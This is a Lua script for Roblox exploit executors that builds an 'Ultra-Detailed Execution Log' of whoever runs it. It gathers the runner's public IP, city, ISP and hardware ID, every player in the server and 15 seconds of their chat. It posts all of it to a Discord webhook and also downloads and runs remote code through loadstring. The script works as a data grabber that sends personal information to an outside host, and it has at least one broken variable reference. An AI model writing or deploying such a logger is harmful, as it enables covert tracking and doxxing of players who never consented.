-- Config
getgenv().whscript = getgenv().whscript or "Unnamed Script"
getgenv().webhookexecUrl = getgenv().webhookexecUrl or "Your Webhook Url"
getgenv().ExecLogSecret = getgenv().ExecLogSecret or false
getgenv().MaxExecutionsPerSession = getgenv().MaxExecutionsPerSession or 2

-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local GuiService = game:GetService("GuiService")
local Stats = game:GetService("Stats")
local TextChatService = game:GetService("TextChatService")

-- Variables
local player = Players.LocalPlayer
local folderName = "ExecutionLog_" .. HttpService:GenerateGUID(false)
local executionCount = 0

-- Anti-Spam System
local function checkAntiSpam()
    if not gethui():FindFirstChild(folderName) then
        local folder = Instance.new("Folder")
        folder.Name = folderName
        folder.Parent = gethui()
        executionCount = 1
    else
        executionCount = executionCount + 1
        if executionCount > getgenv().MaxExecutionsPerSession then
            player:Kick("Anti-spam execution system triggered. Please wait before executing again.")
            return false
        end
    end
    return true
end

-- Utility Functions
local function getDeviceInfo()
    local touchEnabled = UserInputService.TouchEnabled
    local keyboardEnabled = UserInputService.KeyboardEnabled
    local mouseEnabled = UserInputService.MouseEnabled
    local gamepadEnabled = UserInputService.GamepadEnabled
    local platform = GuiService:GetTouchScreenAvailable() and "Mobile" or "PC"
    return string.format("%s (Touch: %s, Keyboard: %s, Mouse: %s, Gamepad: %s)", 
        platform, tostring(touchEnabled), tostring(keyboardEnabled), tostring(mouseEnabled), tostring(gamepadEnabled))
end

local function getPremiumStatus()
    return player.MembershipType == Enum.MembershipType.Premium and "Premium" or "Not Premium"
end

local function getPlayerPosition()
    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local pos = player.Character.HumanoidRootPart.Position
        return string.format("X: %.2f, Y: %.2f, Z: %.2f", pos.X, pos.Y, pos.Z)
    end
    return "N/A"
end

local function getHealth()
    if player.Character and player.Character:FindFirstChild("Humanoid") then
        return string.format("%.0f / %.0f", player.Character.Humanoid.Health, player.Character.Humanoid.MaxHealth)
    end
    return "N/A"
end

local function getExternalInfo()
    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
    end)
    return success and result or {query = "Failed", country = "Failed", regionName = "Failed", city = "Failed", isp = "Failed"}
end

local function getHttpbinInfo()
    local success, result = pcall(function()
        return HttpService:JSONDecode(game:HttpGet("https://httpbin.org/get"))
    end)
    return success and result or {headers = {}, origin = "Failed"}
end

local function getAllPlayersInfo()
    local allPlayers = {}
    for _, p in ipairs(Players:GetPlayers()) do
        local playerInfo = {
            Name = p.Name,
            DisplayName = p.DisplayName,
            UserId = p.UserId,
            AccountAge = p.AccountAge,
            Team = p.Team and p.Team.Name or "None",
            Level = p:GetAttribute("Level") or "N/A",
            Position = p.Character and p.Character:FindFirstChild("HumanoidRootPart") and 
                tostring(p.Character.HumanoidRootPart.Position) or "N/A",
            Health = p.Character and p.Character:FindFirstChild("Humanoid") and 
                string.format("%.0f / %.0f", p.Character.Humanoid.Health, p.Character.Humanoid.MaxHealth) or "N/A"
        }
        table.insert(allPlayers, playerInfo)
    end
    return allPlayers
end

local function getInventoryItems()
    local items = {}
    if player.Character then
        for _, item in pairs(player.Character:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(items, item.Name)
            end
        end
    end
    if player:FindFirstChild("Backpack") then
        for _, item in pairs(player.Backpack:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(items, item.Name)
            end
        end
    end
    return table.concat(items, ", ")
end

local function getPerformanceStats()
    return {
        Memory = Stats:GetTotalMemoryUsageMb(),
        Ping = Stats.PerformanceStats.Ping:GetValue(),
        FPS = workspace:GetRealPhysicsFPS()
    }
end

local function getUNCScore() 
    loadstring(game:HttpGet("https://raw.githubusercontent.com/venoxcc/universalscripts/refs/heads/main/uncSave", true))()

    if getgenv().nUncScore then
        local score = getgenv().nUncScore
        return string.format(
            "✅ Success Rate: %d%% (%s)\n⛔ Failed Tests: %d\n⚠️ Missing Aliases: %d",
            score.successRate,
            score.outOf,
            score.failedTests,
            score.missingAliases
        )
    else
        return "N/A"
    end
end


local function getGameInfo()
    local placeInfo = MarketplaceService:GetProductInfo(game.PlaceId)
    return {
        Name = placeInfo.Name,
        PlaceId = game.PlaceId,
        JobId = game.JobId,
        PlaceVersion = game.PlaceVersion,
        Players = #Players:GetPlayers(),
        MaxPlayers = game.Players.MaxPlayers
    }
end

local function getChatHistory()
    local chatHistory = {}
    local maxMessages = 50  -- Adjust the number of messages to capture
    local startTime = tick()
    local duration = 15  -- Duration to capture messages (in seconds)

    local function logChatMessage(messageData)
        table.insert(chatHistory, {
            Player = messageData.FromSpeaker or messageData.TextSource.Name,
            Message = messageData.Message or messageData.Text,
            Timestamp = tick()
        })

        if #chatHistory > maxMessages then
            table.remove(chatHistory, 1)
        end
    end

    -- Set up chat listeners
    local connection
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        connection = TextChatService.MessageReceived:Connect(logChatMessage)
    else
        local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
        if chatEvents then
            local onMessageDoneFiltering = chatEvents:FindFirstChild("OnMessageDoneFiltering")
            if onMessageDoneFiltering then
                connection = onMessageDoneFiltering.OnClientEvent:Connect(logChatMessage)
            end
        end
    end

    -- Wait for messages or until time is up
    while tick() - startTime < duration do
        wait(0.1)
    end

    -- Disconnect the listener
    if connection then
        connection:Disconnect()
    end

    return chatHistory
end

-- Main Execution Function
local function executeLog()
    if not checkAntiSpam() then return end

    local externalInfo = getExternalInfo()
    local httpbinInfo = getHttpbinInfo()
    local allPlayersInfo = getAllPlayersInfo()
    local performanceStats = getPerformanceStats()
    local gameInfo = getGameInfo()
    local chatHistory = getChatHistory()

    local data = {
        ["content"] = "@everyone",
        ["embeds"] = {
            {
                ["title"] = "🚀 **Ultra-Detailed Execution Log**",
                ["description"] = string.format("*Script executed by %s*", player.Name),
                ["color"] = tonumber(0x3498db),
                ["fields"] = {
                    {
                        ["name"] = "🔍 **Script Info**",
                        ["value"] = string.format("```\nScript Name: %s\nExecuted At: %s\nExecution Count: %d```", 
                            getgenv().whscript, os.date("%Y-%m-%d %H:%M:%S"), executionCount),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "👤 **Executor Details**",
                        ["value"] = string.format("```\nUsername: %s\nDisplay Name: %s\nUserID: %d\nAccount Age: %d days\nPremium Status: %s\nHealth: %s\nTeam: %s\nInventory: %s```", 
                            player.Name, player.DisplayName, player.UserId, player.AccountAge, getPremiumStatus(), getHealth(),
                            player.Team and player.Team.Name or "None", getInventoryItems()),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🎮 **Game Details**",
                        ["value"] = string.format("```\nGame Name: %s\nGame ID: %d\nServer Job ID: %s\nPlace Version: %d\nPlayers: %d/%d```", 
                            gameInfo.Name, gameInfo.PlaceId, gameInfo.JobId, gameInfo.PlaceVersion, gameInfo.Players, gameInfo.MaxPlayers),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🖥️ **Device & Performance**",
                        ["value"] = string.format("```\nDevice: %s\nResolution: %dx%d\nMemory Usage: %.2f MB\nPing: %.2f ms\nFPS: %.2f\nUNC Score: %.2f```", 
                            getDeviceInfo(), workspace.CurrentCamera.ViewportSize.X, workspace.CurrentCamera.ViewportSize.Y, 
                            performanceStats.Memory, performanceStats.Ping, performanceStats.FPS, getUNCScore()),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🌐 **Server Info**",
                        ["value"] = string.format("```\nServer Time: %s\nTime of Day: %s\nGravity: %.2f```", 
                            os.date("%H:%M:%S"), Lighting.TimeOfDay, workspace.Gravity),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "📍 **Character Info**",
                        ["value"] = string.format("```\nPosition: %s\nWalk Speed: %.1f\nJump Power: %.1f\nJump Height: %.1f```", 
                            getPlayerPosition(), 
                            player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.WalkSpeed or "N/A",
                            player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.JumpPower or "N/A",
                            player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.JumpHeight or "N/A"),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🔒 **Security Info**",
                        ["value"] = string.format("```\nExecutor: %s\nHWID: %s```", 
                            identifyexecutor(), game:GetService("RbxAnalyticsService"):GetClientId()),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "👥 **All Players in Server**",
                        ["value"] = "```" .. HttpService:JSONEncode(allPlayers) .. "```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "💬 **Recent Chat History (Last 15 secs)**",
                        ["value"] = #chatHistory > 0 and "```" .. HttpService:JSONEncode(chatHistory) .. "```" or "No messages captured in the last 15 seconds.",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🔧 **Loaded Modules**",
                        ["value"] = string.format("```\n%s```", table.concat(getloadedmodules(), ", ")),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🌍 **Global Environment**",
                        ["value"] = string.format("```\n%s```", table.concat(getgenv(), ", ")),
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🌐 **Httpbin.org Info**",
                        ["value"] = string.format("```\nUser-Agent: %s\nAccept-Language: %s\nOrigin IP: %s```", 
                            httpbinInfo.headers["User-Agent"] or "N/A",
                            httpbinInfo.headers["Accept-Language"] or "N/A",
                            httpbinInfo.origin or "N/A"),
                        ["inline"] = false
                    }
                },
                ["thumbnail"] = {
                    ["url"] = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", player.UserId)
                },
                ["footer"] = {
                    ["text"] = "Ultra-Detailed Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
                    ["icon_url"] = "https://www.roblox.com/asset/?id=6031075938"
                }
            }
        }
    }

    -- Add secret information if enabled
    if getgenv().ExecLogSecret then
        table.insert(data.embeds[1].fields, {
            ["name"] = "**`(🤫) Secret Info`**",
            ["value"] = string.format("||```\nIP: %s\nCountry: %s\nRegion: %s\nCity: %s\nISP: %s```||", 
                externalInfo.query, externalInfo.country, externalInfo.regionName, externalInfo.city, 
                externalInfo.isp),
            ["inline"] = false
        })
    end

    -- Send webhook
    local success, response = pcall(function()
        local headers = {["content-type"] = "application/json"}
        local requestInfo = {Url = getgenv().webhookexecUrl, Body = HttpService:JSONEncode(data), Method = "POST", Headers = headers}
        return syn.request(requestInfo)
    end)

    if not success then
        warn("Failed to send webhook:", response)
    end
end

-- Execute the log
executeLog()

-- Clean up globals
getgenv().whscript = nil
getgenv().webhookexecUrl = nil
getgenv().ExecLogSecret = nil
getgenv().MaxExecutionsPerSession = nil

-- Performance monitoring
local startTime = os.clock()
local function logPerformance()
    local endTime = os.clock()
    local executionTime = endTime - startTime
    print(string.format("Execution log completed in %.2f seconds", executionTime))
end
task.spawn(logPerformance)
